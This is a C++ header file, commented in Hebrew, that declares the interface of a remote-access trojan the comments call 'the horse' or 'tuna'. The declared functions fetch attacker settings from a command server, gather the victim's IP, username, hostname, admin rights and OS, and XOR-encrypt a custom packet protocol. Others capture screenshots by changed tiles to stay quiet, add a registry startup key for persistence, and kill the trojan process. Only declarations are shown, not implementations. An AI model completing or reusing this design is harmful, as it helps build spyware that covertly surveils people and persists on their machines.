#pragma once
#include <string>
#include <time.h>
#include <Lmcons.h>
#include <nlohmann/json.hpp>
#include <random>
#include <ctime>
#include <cmath>
#include <tchar.h>

using namespace nlohmann;
using namespace std;

extern const string DEC_ASCII;


// ---
// מממש את האופרטור כפל כדי שאוכל להכפיל מחרוזות 
// ---
string operator * (string a, int b);


// ---
// param lng: אורך המחרוזת הרנדומלית 
// param payload: מחרוזת שאיתה יווצר המחרוזת הרנדומלית
// ---
string random_ascii(int lng, string payload = "");

// ---
// יוצא אל השרת הראשי בפרוטוקול 
// https
// מוריד את הגדרות החיבור של התוקף
// ---
json get_setting_from_server();

// ---
// מאחזר כתובת ציבורית של היעד
// ---
string get_public_ip();

// ---
// מאחזר את שם המשתמש שהסוס רץ עליו
// ---
string getlogin();

// ---
// מאחזר את שם המארח (שם המחשב) לצורך זיהוי
// ---
string t_gethostname();

// ---
// בודק האם המשתמש יכול להריץ תהליכים כמנהל מערכת
// ---
bool is_elevated_access();

// ---
// מאחזר את מספר הגירסא של מערכת הפעלה ומחזיר את שם הגירסא
// ---
string get_platform_name();


// ---
// מחלקה לצורך היפוך בקידוד 
// ascii
// 1: ascci to byte hex
// 2: byte to ascii hex
// ---
class B2Hex {

public:
	static string a2b_hex(const string&);

	static string b2a_hex(const string&);
};


// ---
// היפוך לוגי במבנה הבייט
// param key: מפתח אורכו לפחות 1
// param value: המידע שאותו רוצים להצפין
// param xorlen: אורך המידע המוצפן
// ---
char* x0r(string key, char* value, size_t x0rlen);

// ---
// זוהי הפונקציה שאחראית על פירוק מבנה החבילה שנוצר על פי
// הפרוטוקול
// param packet: הנתונים שנבנו ע"י הפרוטוקול בתנאיהם השונים
// param lpacket: אורך הנותנים 
// param ignore: האם לזרוק חריגה במידה והנתונים משובשים ,או לא לפי הפרוטוקול
// ---
pair<json, char*> GetBlockPacket(char* packet, size_t lpacket, bool ignore = true);

// ---
// זוהי הפונקציה שאחראית על בניית מבנה החבילה על פי הפרוטוקול
// param info: as json format 
// param binary: מידע של קבצים או סתם מחרוזות
// ---
char* SetBlockPacket(json info, char* binary, size_t lbinary, size_t&size_packet);

// ---
// תפקיד הפונקציה להחזיר את התווים בין התו המתחיל לבין התו המסיים
// param memb: הזיכרון שאיתו הפונקציה תעבוד
// param start: המספר שמציין את מיקום המתחיל
// param stop: המספר שמציין את מיקום הסופי
// param ln: אורך הנתונים 
// ---
char* subchar(char* memb, unsigned int start, unsigned int stop, size_t ln);

/// <summary>
///		תפקיד הפונקציה היא באמת לבצע את החיתוך 
///		אבל היא יותר ספציפית ומחזירה רק 2
///		מחרוזות.
///		כלומר התו או המחרוזת שאיתה אנחנו רוצים שמשם הפונקציה תחתוך
///		יתבצע רק פעם אחת
/// </summary>
/// <param name="memb">
///		הזיכרון שאיתה הפונקציה תעבוד
/// </param>
/// <param name="delimiter">
///		התו או המידע שממנו תתבצע החיתוך
///	</param>
/// <param name="l">
///		אורך הנתונים
///	</param>
/// <returns></returns>
list<pair<unsigned int, char*>> split42chars(char* memb, const char* delimiter, size_t l);

// ---
// תפקיד הפונקציה כחלק מהפרוטוקול זה חיבור המידע לבלוק זיכרון אחד
// ---
char* concatenate3chars_proto(const char* _json, const char* binary, size_t, size_t);

// ---
// הפונקציה תבצע חיבור המידע מתוך וקטור  המכיל בלוקים של 1024 בתים שהתקבלו מתוך התקשורת
// param binary: ווקטור המכיל את נתוני התקשורת
// param lvector: אורך הוקטור
// param deallocate: האם לבצע שחרור זיכרון של אותו וקטור בפונקציה זו, או לא
// ---
char* concatenate_to_char_ptr(list<pair<size_t, char*>>& binary, size_t lvector, bool deallocate=true);

// ---
// אי הקצאת זיכרון לוקטור
// ---
void deallocate_receive_proto(list<pair<size_t, char*>>&packet);

/* SCREENSHOT ANALYZE */
// ---
// מבצע אנליזה על מיפוי המסך
// מבצע חיתוך של 9 חלקים על פני מיפוי מסך שלם, מוודא את אורך כל חלק וחלק האם הוא שונה
// מחלקו הקודם.
// תפקידו הוא  להחזיר מבנה של זוג המכיל אורך כולל ורשימה של בלוקים המכילים זוג
// שהוא מכיל אורך אותו בלוק 
// הזוג ישודר לאחר מכן, הוא עלול לשקול 100% כלומר כל חלקי המסך, והוא יכול לשקול פחות מאלף בתים
// כלומר אף אחד מהחלקים מה שגורם לביצועים נמוכים משמעותית ושקט ברמת התהליכים
// param package: null
// param quailty: איכות הנתונים של התמונה
// param xb: לכמה חלקים לחתוך את התמונה 
// param w: width of screen
// param h: height of screen
// ---
pair<size_t, list<pair<size_t, char*>>> set_X_parts_image(map<string, pair<size_t, char*>>&, int quality=50, int xb=3, int w=1980, int h=1080);

// ---
// מייצר תמונת מסך על פי הפרמטרים שנקבעו
// param w: width of screen
// param h: height of screen
// param quality: איכות התמונה
// param v: התערבות במבנה הנתונים לאופטומציה
// param l: left
// param t: top
// param r: right
// param b: bottom
// ---
pair<size_t, char*> get_img_24_bit_jpg(int w, int h, int quality = 50, bool v = false, int l=0, int t=0, int r=0, int b=0);

// ---
// מחזיר את גודל הקובץ, בתמיכה נרחבת לתמונות מערכת
// ---
size_t get_file_size(const char* path);

// נמחק
// --- deleted
char* read_from_file(const char* path, size_t&);

// ---
// מייצר נתיב זמני
//  מחזיר את אורך הנתיב והנתיב עצמו
// ---
pair<char*, TCHAR*> get_tempfile();


// ---
// מייצר מפתח ברשומות המערכת כדי שהתהליך יעלה אחרי כיבוי 
// ---
unsigned int set_startup_tuna();

// ---
// בודק האם הוגדר המפתח במערכת
// ---
bool is_set_startup();

// ---
// מאחזר את שם הסוס עצמו כלומר שם הקובץ
// ---
int getTunaName(wchar_t* tn);

// ---
// סוגר בכוח את הסוס
// ---
int kill_tuna();
